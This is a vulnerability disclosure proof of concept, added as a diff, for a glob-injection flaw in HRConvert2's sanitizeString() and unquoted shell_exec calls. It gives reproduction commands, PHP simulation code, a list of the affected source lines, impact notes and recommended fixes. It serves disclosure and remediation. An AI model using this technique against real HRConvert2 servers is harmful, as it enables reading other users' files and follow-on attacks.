@@ -1,0 +1,210 @@
+==============================================================
+  HRConvert2 Shell Glob Injection PoC
+  Vulnerability: CWE-78 / CWE-155 (Wildcard/Glob Injection)
+  Affected: HRConvert2 <= 3.4.7
+  Author: cenyuhan0324
+==============================================================
+
+SUMMARY:
+  The ? character passes through sanitizeString() in strict mode.
+  When used in shell_exec() without quoting, bash glob-expands it,
+  causing commands to process unintended files.
+
+PREREQUISITES:
+  - Linux/macOS/WSL with PHP installed (php-cli)
+  - No HRConvert2 installation needed
+
+==============================================================
+REPRODUCTION STEPS
+==============================================================
+
+--- STEP 1: Setup test environment ---
+
+mkdir -p /tmp/poc
+cd /tmp/poc
+echo "SECRET_DATA_1" > fileA.txt
+echo "SECRET_DATA_2" > fileB.txt
+echo "SECRET_DATA_3" > fileC.txt
+echo "attacker_bait" > "file?.txt"
+ls -la
+
+Expected: 4 files including one named file?.txt (with literal ?)
+
+
+--- STEP 2: Prove ? survives sanitizeString(strict) ---
+
+php -r "
+function sanitizeString(\$v, \$s) {
+  if (\$s) \$v = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\\\~#[](){};:\$!#^&%@>*<\"\\'/\`'.chr(9).chr(10).chr(13).chr(0)), '', \$v))))), '-'), ENT_QUOTES, 'UTF-8');
+  return \$v;
+}
+\$input = 'file?.txt';
+\$output = sanitizeString(\$input, TRUE);
+echo \"Input:  \$input\n\";
+echo \"Output: \$output\n\";
+echo \"? survived: \" . (strpos(\$output, '?') !== false ? 'YES' : 'NO') . \"\n\";
+"
+
+Expected output:
+  Input:  file?.txt
+  Output: file?.txt
+  ? survived: YES
+
+
+--- STEP 3: Demonstrate bash glob expansion ---
+
+echo "=== Without quotes (vulnerable) ==="
+echo /tmp/poc/file?.txt
+
+echo "=== With quotes (safe) ==="
+echo '/tmp/poc/file?.txt'
+
+Expected:
+  Without quotes: /tmp/poc/file?.txt /tmp/poc/fileA.txt /tmp/poc/fileB.txt /tmp/poc/fileC.txt
+  With quotes:    /tmp/poc/file?.txt
+
+
+--- STEP 4: Demonstrate information leakage ---
+
+echo "=== Vulnerable (HRConvert2 behavior) ==="
+cat /tmp/poc/file?.txt
+
+echo "=== Safe (with escapeshellarg) ==="
+cat '/tmp/poc/file?.txt'
+
+Expected:
+  Vulnerable: shows attacker_bait + SECRET_DATA_1 + SECRET_DATA_2 + SECRET_DATA_3
+  Safe: shows only attacker_bait
+
+
+--- STEP 5: Simulate ImageMagick command (convertImages line 902) ---
+
+echo "=== Command as written in source ==="
+echo "convert -background none /tmp/poc/file?.txt /tmp/poc/output.png"
+
+echo "=== After bash glob expansion ==="
+eval "echo convert -background none /tmp/poc/file?.txt /tmp/poc/output.png"
+
+Expected:
+  Before: convert -background none /tmp/poc/file?.txt /tmp/poc/output.png
+  After:  convert -background none /tmp/poc/file?.txt /tmp/poc/fileA.txt /tmp/poc/fileB.txt /tmp/poc/fileC.txt /tmp/poc/output.png
+
+
+--- STEP 6: PHP simulation of full attack chain ---
+
+php -r "
+function sanitizeString(\$v, \$s) {
+  if (\$s) \$v = htmlentities(trim(trim(str_replace(' ', '_', str_replace('..', '', str_replace('//', '', str_replace(str_split('|\\\\~#[](){};:\$!#^&%@>*<\"\\'/\`'.chr(9).chr(10).chr(13).chr(0)), '', \$v))))), '-'), ENT_QUOTES, 'UTF-8');
+  return \$v;
+}
+
+\$dir = '/tmp/poc/';
+\$uploaded = 'file?.txt';
+\$sanitized = sanitizeString(\$uploaded, TRUE);
+\$pathname = \$dir . \$sanitized;
+
+echo \"[1] Uploaded filename: \$uploaded\n\";
+echo \"[2] After sanitize: \$sanitized\n\";
+echo \"[3] file_exists check: \" . (file_exists(\$pathname) ? 'PASS' : 'FAIL') . \"\n\";
+echo \"[4] Vulnerable shell_exec:\n\";
+
+// This is what HRConvert2 does:
+\$result = shell_exec('echo ' . \$pathname);
+echo \"    Glob expanded to: \$result\";
+
+// This is the fix:
+\$safe = shell_exec('echo ' . escapeshellarg(\$pathname));
+echo \"[5] Safe (escapeshellarg):\n\";
+echo \"    No expansion: \$safe\";
+"
+
+Expected output:
+  [1] Uploaded filename: file?.txt
+  [2] After sanitize: file?.txt
+  [3] file_exists check: PASS
+  [4] Vulnerable shell_exec:
+      Glob expanded to: /tmp/poc/file?.txt /tmp/poc/fileA.txt /tmp/poc/fileB.txt /tmp/poc/fileC.txt
+  [5] Safe (escapeshellarg):
+      No expansion: /tmp/poc/file?.txt
+
+
+--- STEP 7: Cleanup ---
+
+rm -rf /tmp/poc
+
+
+==============================================================
+TECHNICAL EXPLANATION
+==============================================================
+
+WHY IT WORKS:
+
+  1. sanitizeString() blacklists these characters:
+     | \ ~ # [ ] ( ) { } ; : $ ! ^ & % @ > * < " ' / `
+     
+     Notice: ? is NOT in this list. * is filtered but ? is not.
+
+  2. PHP file_exists() does NOT perform glob expansion.
+     So a file literally named "file?.txt" passes the existence check.
+
+  3. Bash DOES perform glob expansion on unquoted arguments.
+     ? matches any single character.
+     So file?.txt matches: fileA.txt, fileB.txt, fileC.txt, file?.txt
+
+  4. HRConvert2 passes filenames to shell_exec() without escapeshellarg():
+     shell_exec('convert '.$pathname.' '.$newPathname)
+     
+     The variable is inserted directly into the shell string without quoting,
+     so bash glob expansion occurs before the command executes.
+
+AFFECTED SHELL_EXEC CALLS (convertCore.php):
+
+  Line 644:  clamscan -r $path | grep FOUND >> $ClamLogFile
+  Line 862:  xpstopdf $pathname $newPathname
+  Line 864:  python3 unoconv ... -f $extension $pathname
+  Line 902:  convert -background none $wh$rotate $pathname $newPathname
+  Line 937:  xvfb-run -a meshlabserver -i $pathname -o $newPathname
+  Line 964:  dia $pathname -e $newPathname
+  Line 995:  ffmpeg -i $pathname -c:v libx264 $newPathname
+  Line 1026: ffmpeg -i $pathname $newPathname
+  Line 1057: ffmpeg -protocol_whitelist ... -i $pathname -c copy $newPathname
+  Line 1097: ffmpeg -y -i $pathname $ext $br $newPathname
+  Line 1141: 7z x -aoa $pathname -o$safedir2
+  Line 1156: 7z a -t$extension $newPathname $safedir2
+  Line 1172: mkisofs -o $newPathname $safedir2
+  Line 1575: rar a -ep $newPathname $pathname
+  Line 1577: zip -j $newPathname $pathname
+  Line 1579: 7z a $newPathname $pathname
+  Line 1581: mkisofs -o $newPathname $pathname
+  Line 1947: clamscan -r $ConvertDir.$file | grep FOUND >> $UserClamLogFile
+
+IMPACT:
+
+  - Process/read unintended files in the same directory
+  - Information disclosure if multiple users share directory space
+  - ClamAV scans unintended files
+  - ImageMagick/FFmpeg processes unintended inputs
+  - Potential for crafted image files to trigger ImageMagick vulnerabilities
+    on files the attacker couldn't directly reference
+
+SEVERITY: Medium (CVSS ~5.3)
+  - Requires file upload capability (available without auth by default)
+  - Limited to same-directory file matching
+  - No direct code execution, but enables secondary attacks
+
+FIX:
+
+  Option A: Add ? to the blacklist in sanitizeString():
+    str_split('|\\~#[](){};:$!#^&%@>*<"\'/`?')
+
+  Option B (recommended): Use escapeshellarg() for all shell variables:
+    shell_exec('convert '.escapeshellarg($pathname).' '.escapeshellarg($newPathname));
+
+  Option C (best): Replace shell_exec() with proc_open() + argument arrays:
+    $cmd = ['convert', '-background', 'none', $pathname, $newPathname];
+    $proc = proc_open($cmd, $descriptorspec, $pipes);
+
+
+==============================================================
+END OF POC
+==============================================================
